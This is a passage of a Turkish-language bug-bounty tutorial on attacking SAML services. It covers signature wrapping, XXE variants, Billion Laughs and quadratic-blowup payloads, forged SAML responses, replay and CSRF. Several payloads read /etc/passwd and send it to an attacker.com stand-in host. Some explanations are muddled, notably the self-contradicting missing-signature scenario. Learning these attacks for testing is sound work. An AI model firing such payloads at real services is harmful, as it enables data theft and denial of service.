      <Audience>https://service-provider.com</Audience>
    </AudienceRestriction>
  </Conditions>
  <AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5b">
    <AuthnContext>
      <AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
    </AuthnContext>
  </AuthnStatement>
  <Object>
    <!-- Orijinal Assertion'ın imzası kaldırılmış kopyası -->
    <Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5c" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
      <Issuer>https://identity-provider.com</Issuer>
      <Subject>
        <NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
        <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
          <SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
        </SubjectConfirmation>
      </Subject>
      <Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
        <AudienceRestriction>
          <Audience>https://service-provider.com</Audience>
        </AudienceRestriction>
      </Conditions>
      <AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5b">
        <AuthnContext>
          <AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
        </AuthnContext>
      </AuthnStatement>
    </Assertion>
  </Object>
  <Signature>
    <!-- İmza bilgileri burada yer alır -->
  </Signature>
</Assertion>
```
Yukarıdaki örnekte, "Object" bloğu içine yerleştirilen klonlanmış Assertion (_e55c9c3e8e9f6744e6e8d18d5f7fdd5c ID değeri ile ayırt edilir), orijinal Assertion'ın imzası kaldırılmış bir kopyasını içermektedir. Bu şekilde, hizmet sağlayıcı, orijinal Assertion'ı kabul ederken imzasını doğrulamaz ve saldırganın manipüle ettiği Assertion'ı da kabul eder.

<h3> <b> Evet XSW Attacklarını geride bırakmış bulunuyoruz. Çok kafa karıştırıcı bir konu olabileceğinin farkındayım çok hızlı bir şekilde beyine yükleme istiyor. Bunu çalışma tarzınız eğer buraya kadar okuyup başlangıçta okuduğunuzu unuttuysanız oturup kalem kağıt kullanarak tüm XSW~ attack çeşitlerinin özelliklerini tek tek kalem kağıtla tekrardan yazmanız olacaktır. Evet bu işlevi yapan `SAML Raider` adında bir burp extension'ı olsa bile bu güvenlik açıklarının nasıl işlediğini bilmeniz özel bir şeyler bulabilmeniz için önemlidir. Unutmayın bir bug bounter doğal olarak tool'lar kullansa bile işi gerçekten öğrenebilmek ve değer teşkil edebilmeniz için tool ile yaptığınız her şeyi manuel olarakta yapabilmeli ve kendi toolarınızı geliştirebilecek durumda olmalısınız. </b></h3>

## XML Attack

bir SAML uygulamasının XML verilerini işlerken yetersiz giriş doğrulaması ve DTD (Document Type Definition) işlemesi nedeniyle ortaya çıkabilir. İki ana saldırı türü söz konusudur: XXE (XML External Entity) saldırıları ve XML DoS (Denial of Service) saldırıları.

**XXE Saldırıları**: XXE saldırıları, bir XML işlemcüsünün dış varlıkları (external entities) işlemesini kullanarak hassas bilgileri ifşa etmeyi veya sunucuyu etkilemeyi amaçlar. Bu saldırılar, DTD içeren XML verilerinin analiz edildiği durumlarda gerçekleşir.
Bir saldırgan, kötü niyetli bir XML dosyasıyla SAML uygulamasına saldırabilir. XML verilerini işlerken, uygulama dış varlıkları işler ve bu dış varlıkların değerlerini okur. Saldırgan, dış varlıkları kullanarak yerel dosyalara erişebilir, ağ üzerindeki diğer hedeflere saldırabilir veya hassas verileri ifşa edebilir. Örneğin, bir saldırgan, sistemdeki dosyalara erişim sağlamak için bir dış varlık olarak "file://" protokolünü kullanabilir.

**XML DoS Saldırıları (Billian Laugh Attack)**: XML DoS saldırıları, büyük, karmaşık veya kötü biçimlendirilmiş XML verileriyle bir sistemde hizmet kesintisi oluşturmayı amaçlar. Bu saldırılar, hedef sistemdeki XML işlemcinin kaynakları tüketmesine neden olur.
Billian Laugh Attack, özellikle SAML uygulamalarında yaygın bir XML DoS saldırısıdır. Saldırganlar, bir XML dosyasını öyle bir şekilde biçimlendirirler ki, işlemci tarafından çözülmesi uzun süre alır ve aşırı kaynak tüketimine neden olur. Bu durumda sistem, saldırganın yaratıcı biçimlendirme nedeniyle aşırı yüklendiği için normal işlevselliğini yerine getiremez ve hizmet kesintisi yaşanır.

Bu güvenlik açığı, kötü niyetli saldırganların SAML uygulamasını istismar etmelerine ve sistemdeki hassas verilere erişmelerine veya hizmet kesintisi oluşturmalarına izin verebilir. Bu tür saldırılara karşı koymak için giriş doğrulamasının güçlendirilmesi, DTD işlemesinin devre dışı bırakılması veya güvenli XML işlemcilerinin kullanılması gibi önlemler alınmalıdır.

Şimdi sizlere bu atak çeşitleri hakkında bilgilendirmeler yapacağım. Unutmamanız gereken şey bu tam bir çözüm değildir. Her gün yeni saldırı türleri keşfedilmekte ve saldırı yüzeyleri sürekli olarak değişmektedir. Burada sizlere temel atmayı amaçlamaktayım. 

<hr>

### Atak Türlerine göz atalım

Burada bildiğim atak türlerini anlatacağım. Bugüne özel eksiklerim bir ihtimalle olabilir. Bunları düzeltmek için PR atabilir veya issue açabilirsiniz. Anlatacağım atak türleri hakkında senaryolar oluşturacak ve kod örnekleri vereceğim. 
<hr>

**Internal Subset Attack (İçerik Alt Kümesi Saldırısı)** : Saldırgan, <!ENTITY> bildirimleriyle bir DTD içerik alt kümesi oluşturarak hassas sistem bilgilerine erişebilir:

Senaryo: İlk olarak size <!ENTITY üzerine saçma sapan xxe yazın ve direkt olarak ekranda büyülü bir şekilde /etc/passwd dönsün demeyeceğim. Bunu gidip internet üzerindeki herhangi bir alanda bulabilirsiniz biz varsayılan zafiyetli SAML'a biraz daha farklı saldıracağız.

- Saldırgan, hedef SAML servisine göndermek üzere kötü niyetli bir XML içeriği oluşturur.

- XML içeriği aşağıdaki gibi bir DTD (Document Type Definition) içerir:

```
<!DOCTYPE root [
    <!ENTITY % internalSubset SYSTEM "file:///etc/passwd">
    <!ENTITY % payload "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%internalSubset;'>">
    %payload;
    %internalSubset;
]>
Bu DTD, bir içerik alt kümesi tanımlar ve iki adet dış varlık (%internalSubset ve %payload) oluşturur.
```

- %internalSubset dış varlığı, "file:///etc/passwd" adresine işaret eder. Bu, saldırganın /etc/passwd dosyasının içeriğini elde etmek istediği yerdir.

- %payload dış varlığı, exfil adında bir dış varlık oluşturur ve içeriğini "http://attacker.com/?data=%internalSubset;" adresine yönlendirir. Burada, %internalSubset dış varlığının değeri kullanılır.

- Saldırgan, %payload ve %internalSubset dış varlıklarını XML içeriği içinde kullanır: ` <root></root> `

- Saldırgan, hazırlanan XML içeriğini hedef SAML servisine gönderir.

- Hedef SAML servisi, gelen XML içeriğini işlerken DTD'yi analiz eder.

- DTD içinde tanımlanan dış varlıklar (%payload ve %internalSubset) işlenir. Bu işlem sonucunda, exfil adında bir dış varlık tanımlanır ve %internalSubset dış varlığına başvurularak /etc/passwd dosyasının içeriği elde edilir.

- Elde edilen /etc/passwd dosyasının içeriği, saldırganın kontrolündeki "http://attacker.com/?data=%internalSubset;" adresine gönderilir.


Sonuç olarak, saldırgan /etc/passwd dosyasının içeriğini elde edebilir ve bu bilgiyi http://attacker.com adresine gönderir. Bu şekilde, hedef sistemin hassas kullanıcı bilgileri saldırgan tarafından elde edilebilir.

Bununda engellenebileceğinin farkındayım. Fakat unutmayın bir hacker her zaman farklı düşünmeli. Sizi biraz daha farklı düşünmeye sevk ediyorum. Mesela olayı zorlaştıralım sizin attacker.com üzerine istek gönderemiyorsunuz çünkü firewall sizi engelliyor diyelim. Aynı zamanda ekrana herhangi bir çıktıda alamıyorsunuz çünkü bu da engelleniyor. Ne yaparsınız? Burada bırakır mısınız? Yoksa farklı bir atak tarzı düşünebiliyor musunuz? Bunun için bir issue bırakın ve atak yöntemlerinizi değerlendirelim.

<hr>

**External Entity Attack (Dış Varlık Saldırısı)**: Saldırgan, <!ENTITY> bildirimleriyle dış varlıkları referans göstererek yerel veya uzak dosyalara erişebilir veya ağ üzerindeki diğer hedeflere saldırabilir.

- Saldırgan, hedef SAML servisi üzerindeki bir uygulamayı hedef olarak seçer.
- Saldırgan, hedef SAML servisine göndermek üzere bir XML içeriği oluşturur.
- Saldırgan, DTD bölümünde aşağıdaki gibi bir dış varlık tanımı yapar:
```
<!ENTITY % payload SYSTEM "http://attacker.com/xxe.dtd">
<!ENTITY % externalEntity "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%internal;'>">
%payload;

Bu dış varlık tanımı, daha gizli bir payload olan "http://attacker.com/xxe.dtd" dosyasına işaret eder. Bu dosya, saldırganın kontrolündeki bir sunucuda bulunur.

```

- Saldırgan, oluşturulan dış varlık tanımlarını XML içeriği içinde kullanır:

```
<!DOCTYPE root [
<!ENTITY % externalEntity SYSTEM "http://attacker.com/xxe.dtd">
%externalEntity;
]>
<root></root>

```

- Saldırgan, hazırlanan XML içeriğini hedef SAML servisine gönderir.
- Hedef SAML servisi, gelen XML içeriğini işlerken DTD'yi analiz eder.
- DTD içinde tanımlanan dış varlıklar (%payload ve %externalEntity) işlenir ve ilgili URL'lere başvurulur.
- Saldırganın kontrolündeki "http://attacker.com/xxe.dtd" adresine istek gönderilir.
- Saldırganın kontrolündeki sunucudan gelen yanıt içindeki payload işlenir ve exfil adında bir dış varlık tanımlanır.
- exfil dış varlığına başvurularak istenilen veri (örneğin, hassas dosya içeriği) saldırgana gönderilir.

Bu örnekte, saldırgan Dış Varlık Saldırısı kullanarak hedef SAML servisinin kontrolündeki sunucudan istenilen dosyayı çekebilmektedir.

**Parameter Entity Attack (Parametre Varlık Saldırısı)**: Saldırganın <!ENTITY> bildirimlerini parametre varlıkları olarak kullanarak hassas bilgilere erişebildiği veya sistem kaynaklarını etkileyebildiği bir saldırı yöntemidir. Bu saldırı tipinde, saldırgan XML belgesinde parametre varlıklarını manipüle ederek istenmeyen sonuçlara yol açar.

Örneğin, bir SAML servisi hedef alındığını düşünelim. Saldırgan, SAML isteğinde parametre varlıklarını manipüle ederek bir Parameter Entity Attack gerçekleştirmek istiyor. Hedef SAML belgesi şu şekilde görünüyor:

```
<samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                    ID="1234"
                    Version="2.0"
                    IssueInstant="2023-07-01T10:00:00Z">
    <saml:Issuer>https://sp.example.com</saml:Issuer>
    <samlp:NameIDPolicy AllowCreate="true" />
    <samlp:RequestedAuthnContext Comparison="exact">
        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
    </samlp:RequestedAuthnContext>
</samlp:AuthnRequest>

```
Saldırgan, hedef SAML belgesindeki parametre varlıklarını manipüle ederek hassas bilgilere erişmek istiyor. Bunun için aşağıdaki gibi bir XML içeriği oluşturuyor:

```
<!DOCTYPE root [
<!ENTITY % parameterEntity SYSTEM "file:///etc/passwd">
<!ENTITY % payload "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%parameterEntity;'>">
%payload;
]>
<samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                    ID="1234"
                    Version="2.0"
                    IssueInstant="2023-07-01T10:00:00Z">
    <saml:Issuer>https://sp.example.com</saml:Issuer>
    <samlp:NameIDPolicy AllowCreate="true" />
    <samlp:RequestedAuthnContext Comparison="exact">
        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
    </samlp:RequestedAuthnContext>
    %exfil;
</samlp:AuthnRequest>

```
Bu XML içeriğinde, saldırgan bir parameterEntity tanımlaması yaparak "/etc/passwd" dosyasına işaret ediyor. Ardından, payload adında bir dış varlık tanımlaması yapıyor. Bu tanımlama, exfil adında bir dış varlık oluşturarak içeriğini "http://attacker.com/?data=%parameterEntity;" adresine yönlendiriyor.

Son olarak, saldırgan oluşturduğu XML içeriğinde %exfil dış varlığını kullanarak hedef sisteme saldırıyı gerçekleştiriyor. Bu sayede, hedef sistemin /etc/passwd dosyasının içeriği saldırgan tarafından elde edilip "http://attacker.com" adresine gönderilebilir.

**Billion Laugh Attack (Milyar Kere Gülelim Saldırısı /evet ismi çok tuhaf/)**: bir XML işlemcisini aşırı yükleyerek hizmetin kullanılamaz hale gelmesine neden olan bir saldırı yöntemidir. Bu saldırı tipinde, saldırgan XML içeriğinde kendini tekrar eden bir desen oluşturarak işlemciyi yoğun bir şekilde çalıştırır.

Örneğin, bir SAML servisi hedef alındığını düşünelim. Saldırgan, XML içeriğini aşağıdaki gibi manipüle ederek Billion Laugh Attack saldırısını gerçekleştirmek istiyor:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY a "ha">
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
<!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
<!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
<!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;">
<!ENTITY g "&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;">
<!ENTITY h "&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;">
<!ENTITY i "&h;&h;&h;&h;&h;&h;&h;&h;&h;&h;">
<!ENTITY j "&i;&i;&i;&i;&i;&i;&i;&i;&i;&i;">
<!ENTITY k "&j;&j;&j;&j;&j;&j;&j;&j;&j;&j;">
<!ENTITY billionLaughs "&k;&k;&k;&k;&k;&k;&k;&k;&k;&k;">
]>
<root>
    <content>&billionLaughs;</content>
</root>

```

Bu XML içeriğinde, saldırgan "ha" adında bir dış varlık (a) tanımlıyor ve bu dış varlığı kullanarak kendini tekrar eden bir desen oluşturuyor. Her bir dış varlık bir öncekinden 10 kat daha fazla tekrarlanıyor. Sonuç olarak, "billionLaughs" adında bir dış varlık oluşturuluyor ve bu dış varlık içerisinde kendini tekrar eden bir desen bulunuyor.

Hedef SAML işlemcisi bu XML içeriğini işlemeye başladığında, "billionLaughs" dış varlığındaki kendini tekrar eden desen nedeniyle işlemci yoğun bir şekilde çalışmaya başlar. İşlemcinin bu yoğunluğu, kaynak tükenmesine ve hizmetin kullanılamaz hale gelmesine yol açabilir.


**Quadratic Blowup Attack**: XML işlemcilerin aşırı derecede uzun bir zinciri işlemeye çalıştığında hafızanın aşırı kullanılmasına neden olabilir. Bu durumda, XML işlemcisi yetersiz hafıza veya işlem süresi nedeniyle aşırı yüklenir ve hizmetin kullanılamaz hale gelmesine yol açabilir.

Saldırgan, XML içeriğindeki dış varlıkları kullanarak aşırı derecede uzun bir zincir oluşturur. Örneğin, aşağıdaki XML içeriği saldırıya yönelik bir örnek göstermektedir:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!ENTITY a "xxxxxxxxxx">
    <!ENTITY b "&a;&a;">
    <!ENTITY c "&b;&b;">
    <!ENTITY d "&c;&c;">
    <!ENTITY e "&d;&d;">
    <!ENTITY f "&e;&e;">
    ]>
<root>&f;</root>

```

- XML içeriği, hedef SAML servisine POST ile gönderilir.
- SAML işlemcisi, XML içeriğini işlemeye başlar ve dış varlıkları genişletir. Bu durumda, zincirin her bir aşaması tekrar tekrar genişletilecektir.
- Zincirin her bir aşaması diğer aşamalara referansla tekrar tekrar genişletildiğinde, XML işlemcisi aşırı derecede uzun bir metin zinciriyle karşılaşır. Bu, hafızanın aşırı kullanılmasına ve işlem süresinin artmasına neden olur.
- XML işlemcisi yetersiz hafıza veya işlem süresi nedeniyle aşırı yüklenir ve hizmetin kullanılamaz hale gelmesine yol açar.

**Out-of-Band (OOB) XXE Attack**, saldırganın XXE saldırısının sonuçlarını hedef sistemden bağımsız bir şekilde dışarıya iletebilmesini sağlayan bir saldırı yöntemidir. Bu saldırı yöntemi, DNS sorguları, HTTP istekleri veya diğer ağ bağlantıları gibi dış iletişim mekanizmalarını kullanır.

Aşağıda Out-of-Band XXE Attack'in çalışma biçimini anlatan adım adım bir örnek verilmiştir:

- Saldırgan, hedef sistem üzerinde XXE açığını keşfeder. Bu açık, hedef sistemdeki bir XML işlemcisinde dış varlıkların işlendiği ve dış iletişim mekanizmalarının kullanılabildiği bir zafiyettir.

- Saldırgan, hedef sisteme gönderilecek olan XML içeriğini hazırlar. Bu içerik, XXE saldırısını gerçekleştirmek için gerekli olan dış varlık bildirimlerini içerir.

- Saldırgan, XML içeriğindeki dış varlık bildirimlerini, Out-of-Band saldırısı için uygun olan dış iletişim mekanizmalarına yönlendirir. Örneğin, saldırgan XML içeriğinde DNS sorguları, HTTP istekleri veya FTP bağlantıları gibi dış bağlantılar kullanabilir.

- Saldırgan, hazırladığı XML içeriğini hedef sisteme gönderir. Bu işlem genellikle bir HTTP POST isteğiyle gerçekleştirilir.

- Hedef sistem, saldırgan tarafından gönderilen XML içeriğini işlemeye başlar. İşlem sırasında, dış varlık bildirimleri çalıştırılır ve dış iletişim mekanizmalarına yönlendirilir.

- Dış iletişim mekanizması kullanılarak, saldırganın kontrolündeki sunucuya veya hedef sistemden bağımsız bir başka hedefe bilgi gönderilir. Örneğin, DNS sorgularıyla saldırganın kontrolündeki bir sunucuya bilgi gönderilebilir veya HTTP istekleriyle saldırganın kontrolündeki bir sunucuya veri aktarılabilir.

- Saldırgan, dış iletişim mekanizması aracılığıyla hedef sistemden elde ettiği bilgileri veya saldırı sonuçlarını alır.

Birkaç XML örneği (bunun nasıl yapıldığını çözmeyi size bırakıyorum):

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">
<!ENTITY % send SYSTEM "dns://attacker.com/">
%remote;
]>
<root>
  <data>&send;</data>
</root>
```

xxe.dtd:

```
<!ENTITY % send "<!ENTITY &#x25; request SYSTEM 'dns://attacker.com/?domain=mytarget.com'>">
%send;

```


Gerçek hayattan bir örnek olarak, bir e-ticaret web sitesinin XML tabanlı bir API'sine karşı Out-of-Band XXE Attack düşünelim. Saldırgan, XML içeriğindeki dış varlık bildirimlerini kullanarak API'ye bir HTTP POST isteği yapar. Bu isteğin içeriğinde, saldırganın kontrolündeki sunucuya veri gönderen bir dış iletişim mekanizması kullanılır. Saldırgan, sunucuya gelen istekleri izler ve saldırı sonuçlarını alır. Örneğin, kullanıcı bilgilerini veya ödeme bilgilerini elde edebilir.


**Blind XXE Attack (Kör XXE Saldırısı):** Saldırganın hassas verilerin geri dönüşünü alamadığı durumlarda bile XXE saldırısı gerçekleştirmesini sağlayan bir saldırı yöntemidir. Bu saldırıda, saldırgan, XML işlemcisinden gelen yanıtların varlığını veya yokluğunu kontrol ederek hedef sistemle ilgili bilgileri elde etmeye çalışır.

Aşağıda Blind XXE Attack'in çalışma biçimini anlatan adım adım bir örnek verilmiştir:

- Saldırgan, hedef sistem üzerinde XXE açığını keşfeder. Bu açık, XML işlemcisinde dış varlıkların işlendiği ve dış ağ bağlantılarının yapılabildiği bir zafiyettir.

- Saldırgan, XML içeriğini hazırlar ve XXE saldırısı için gerekli olan dış varlık bildirimlerini ekler. Bu XML içeriği, hedef sistemde işlenecek olan bir XML isteğini temsil eder.
 
- Saldırgan, hazırladığı XML içeriğini hedef sistemdeki hedef uygulamaya gönderir. Bu genellikle bir HTTP POST isteği ile gerçekleştirilir.
 
- Hedef sistem, saldırgan tarafından gönderilen XML içeriğini işlemeye başlar. İşlem sırasında, dış varlık bildirimleri çalıştırılır.
 
- Saldırgan, XML işlemcinin verdiği yanıtlardan yola çıkarak hedef sistemle ilgili bilgileri elde etmeye çalışır. Örneğin, saldırgan, bir dış varlık bildiriminde belirtilen bir dosya veya kaynak varlığının varlığını veya yokluğunu kontrol etmek için XML işlemcinin yanıtını değerlendirebilir.
 
- Saldırgan, XML işlemcinin verdiği yanıtların farklılıklarını veya hata mesajlarını analiz ederek hassas bilgilere ilişkin ipuçları bulabilir. Örneğin, bir yanıtta belirli bir dış varlık varken, diğer bir yanıtta bu varlığın olmadığını tespit edebilir.

Blind XXE Attack'in gerçek hayattan bir örneği olarak, bir web uygulamasının XML tabanlı bir API'sine karşı düşünebiliriz. Saldırgan, API'ye gönderdiği XML isteğinde dış varlık bildirimlerini kullanır. API, saldırganın gönderdiği XML isteği işler ve yanıt olarak bir sonuç döndürür. Saldırgan, bu yanıtı analiz ederek API'nin işlem sürecindeki davranışları hakkında bilgi edinebilir. Örneğin, farklı yanıtların hata mesajları veya farklı yanıtların varlıkların varlığına ilişkin bilgiler içermesi durumunda, saldırgan API'nin içerisindeki hassas bilgileri veya yapıyı anlama şansına sahip olabilir.

## SAML Message Integrity Abuse

SAML (Security Assertion Markup Language), çeşitli sistemler arasında kimlik doğrulama ve yetkilendirme bilgilerini güvenli bir şekilde paylaşmak için kullanılan bir standarttır. Ancak, SAML mesaj bütünlüğü kötüye kullanımı, saldırganların başka kullanıcıların SAML mesajlarını veya sahte SAML mesajlarını kullanarak kısıtlamaları atlamasına veya kimlik doğrulama mekanizmalarını yanıltmasına neden olabilir.

Bir senaryo düşünelim:

- Alice, bir e-ticaret sitesine (SP) erişmek istiyor ve kimlik doğrulama yapmak için IdentityProvider (IdP) ile iletişime geçiyor.

- Alice, SP'ye giriş yapmak için bir SAML isteği oluşturuyor ve IdP'ye gönderiyor. Aşağıda bir örnek SAML isteği bulunmaktadır:

```
<AuthnRequest>
   <Issuer>SP</Issuer>
   <NameIDPolicy Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified"/>
</AuthnRequest>
```

- Saldırgan, Alice'ın SAML isteğini ele geçiriyor ve SP'ye yetkisiz erişim elde etmek istiyor.

- Saldırgan, sahte bir SAML yanıtı oluşturarak kimlik doğrulama mekanizmasını yanıltmaya çalışıyor. Örneğin:

```
<Response>
   <Issuer>IdP</Issuer>
   <Status>
      <StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
   </Status>
   <Assertion>
      <Subject>
         <NameID>saldırgan_kullanıcı</NameID>
      </Subject>
      <Conditions>
         <AudienceRestriction>
            <Audience>SP</Audience>
         </AudienceRestriction>
      </Conditions>
   </Assertion>
</Response>

```

- Saldırgan, sahte SAML yanıtını SP'ye gönderiyor.

- SP, sahte SAML yanıtını doğru olarak kabul ediyor ve saldırganın kimlik doğrulamasını başarılı bir şekilde geçtiğini düşünüyor.

Sonuç olarak, saldırgan, Alice'ın hesabını taklit ederek SP sistemine yetkisiz erişim sağlamış oluyor.

Bu senaryo, SAML mesaj bütünlüğü kötüye kullanımının bir örneğini göstermektedir. Saldırgan, kimlik doğrulama sürecini yanıltmak için sahte bir SAML yanıtı oluşturarak SP sistemine yetkisiz erişim elde etmektedir.

## Missing veya Invalid Signature
saldırganın bir imza oluşturup uygulamayı kötüye kullanmasına izin verebilir. Bu durumda, saldırgan imza doğrulama mekanizmasını atlayabilir ve verileri manipüle edebilir. İşte bir senaryo:

Bir şirketin SP (Service Provider) olarak adlandırılan bir hizmet sağlayıcısı ve IdP (Identity Provider) olarak adlandırılan bir kimlik sağlayıcısı vardır. SP, kullanıcıların kimlik doğrulamasını ve yetkilendirilmesini IdP'ye sağlar. 

- Alice, bir web uygulamasına SP üzerinden erişmek istiyor. SP'ye kimlik doğrulama yapması için bir SAML isteği gönderir.

- SP, Alice'ın kimlik bilgilerini doğrulamak için IdP'ye bir SAML isteği oluşturur ve gönderir. Bu SAML isteği aşağıdaki gibi olabilir:

```
<AuthnRequest>
   <Issuer>SP</Issuer>
   <NameIDPolicy Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified"/>
</AuthnRequest>

```

- Saldırgan, Alice'ın SAML isteğini ele geçirir ve bir saldırı gerçekleştirmek istiyor. Saldırgan, imza doğrulama sürecini atlatabilmek için sahte bir SAML yanıtı oluşturur. Örneğin:

```
<Response>
   <Issuer>IdP</Issuer>
   <Status>
      <StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
   </Status>
   <Assertion>
      <Subject>
         <NameID>alice@example.com</NameID>
      </Subject>
      <Conditions>
         <AudienceRestriction>
            <Audience>SP</Audience>
         </AudienceRestriction>
      </Conditions>
   </Assertion>
</Response>
```

- Saldırgan, sahte SAML yanıtını Alice'ın SAML isteğiyle birlikte SP'ye gönderir.

- SP, SAML yanıtını alır ve imza doğrulama mekanizmasını uygular. Ancak, imza eksik veya geçersiz olduğu için doğrulama başarısız olur. SP, SAML yanıtını reddeder ve işlemi durdurur.

Sonuç olarak, saldırgan, imza doğrulama mekanizmasını atlattığı için SP'ye yetkisiz erişim sağlayamaz ve Alice'ın hesabına erişemez.

Sonuç olarak, SP, imzayı doğrulayamadığı için saldırganın kimlik doğrulama mekanizmasını atlamasına izin vermez. Alice, SP'ye erişmeye devam edemez çünkü kimlik doğrulaması başarısız olmuştur. Saldırganın elde ettiği şey, SP'ye erişim izni değil, sadece işlemi durdurmak veya hizmeti engellemek olabilir.

## SAML Message Replay

Aynı SAML mesajının tekrar tekrar gönderilerek kimlik doğrulama mekanizmasını yanıltma girişimidir. Bu tür saldırılara karşı önlem olarak, SAML mesajlarında Assertion ID'lerin benzersiz olması ve her bir ID'nin yalnızca bir kez kabul edilmesi gerekmektedir.

- Alice, bir SP'ye erişmek istiyor ve kimlik doğrulama yapmak için IdP ile iletişime geçiyor.

- Alice, SP'ye erişmek için bir SAML isteği oluşturuyor ve IdP'ye gönderiyor. Bu SAML isteği aşağıdaki gibi olabilir:

```
<AuthnRequest>
   <Issuer>SP</Issuer>
   <AssertionConsumerServiceURL>https://sp.com/acs</AssertionConsumerServiceURL>
   <ID>123456789</ID>
</AuthnRequest>
```

- IdP, SAML isteğini alır ve kimlik doğrulama işlemlerini gerçekleştirir.

- IdP, başarılı kimlik doğrulamasının ardından SP'ye bir SAML yanıtı oluşturur. Bu SAML yanıtında Assertion ID'yi benzersiz bir şekilde oluşturur. Örneğin:


```
<Response>
   <Issuer>IdP</Issuer>
   <Status>
      <StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
   </Status>
   <Assertion ID="ABC123">
      <Subject>
         <NameID>alice@example.com</NameID>
      </Subject>
      <Conditions>
         <AudienceRestriction>
            <Audience>SP</Audience>
         </AudienceRestriction>
      </Conditions>
   </Assertion>
</Response>
```

- SP, SAML yanıtını alır ve Assertion ID'yi kontrol eder. Eğer Assertion ID daha önce kabul edilmişse, SP saldırıyı tespit eder ve işlemi reddeder. Assertion ID daha önce kabul edilmemişse, SP kimlik doğrulamasını başarılı olarak kabul eder ve Alice'a erişim sağlar.

SAML Replay saldırısı durumunda, saldırgan aynı SAML mesajını tekrar göndererek kimlik doğrulama mekanizmasını yanıltmaya çalışır. Saldırgan, mesajı birden fazla kez gönderdiğinde, SP'nin aynı mesajı birden fazla kez kabul etmesini veya işlemesini hedefler.

Saldırganın elde edebileceği sonuçlar aşağıdaki gibi olabilir:

- İşlemi Tekrarlatma: Saldırgan, aynı SAML mesajını tekrar tekrar göndererek SP'ye aynı kimlik doğrulama işlemini yapma talimatı verebilir. Bu durumda SP, her bir mesajı kabul eder ve aynı işlemi birden fazla kez gerçekleştirir. Sonuç olarak, SP, saldırganın taleplerini yanıtlar ve hizmetlerini gereksiz yere kullanır.

- Yetkilendirme İhlali: Eğer saldırgan aynı SAML mesajını farklı bir kullanıcı adına gönderirse, SP, her bir mesajı farklı kullanıcılar olarak işleyebilir. Bu durumda, saldırgan, diğer kullanıcıların hesaplarına yetkisiz erişim sağlama girişiminde bulunabilir veya hizmetleri kötüye kullanabilir.

- Hizmet Engelleme: Saldırgan, aynı SAML mesajını tekrar tekrar göndererek SP'yi işlem yüküyle aşırı yükleyebilir. SP, her bir mesajı kabul etmeye çalışırken, kaynaklarını tüketir ve gerçek kullanıcılara hizmet verme kapasitesini azaltır. Sonuç olarak, SP, normal kullanıcıları reddedebilir veya hizmetlerini sağlamak için performans sorunları yaşayabilir.

## CSRF

SAML protokolü, SP ve IdP arasında yapılan iletişimi XML tabanlı mesajlar aracılığıyla gerçekleştirir. CSRF saldırıları SAML protokolüne etki edebilir çünkü SAML mesajları, bir kullanıcının kimlik bilgilerini içeren güvenli bir şekilde imzalanmış XML içerikleridir. Bu nedenle, saldırganın kullanıcı adı ve parolasını ele geçirmesi durumunda, SAML protokolü üzerinde CSRF saldırıları gerçekleştirilebilir.

### Genel bir atak senaryosu

- Hedef uygulamanın SAML entegrasyonunu tespit etmek: Hedef uygulamanın SAML entegrasyonunu belirlemek için hedefin SAML tabanlı oturum açma veya kimlik doğrulama mekanizmasını kullanarak yapılan istekleri ve yanıtları izleyebilirsiniz.
- Saldırıya hedef olan işlemleri belirlemek: SAML protokolü üzerinde gerçekleştirilecek CSRF saldırısı için hedef uygulamada hangi işlemlerin hedef alınacağını belirlemelisiniz. Örneğin, oturum açma, kullanıcı bilgilerini güncelleme veya yeni bir kaynak erişimi talebi gibi işlemler hedeflenebilir.
- Saldırı için sahte HTML sayfası oluşturmak: Saldırıda kullanılacak sahte HTML sayfasını hazırlamalısınız. Bu sayfa, kullanıcının tarayıcısında görüntülenerek saldırıyı tetikleyecek form veya butonları içermelidir.
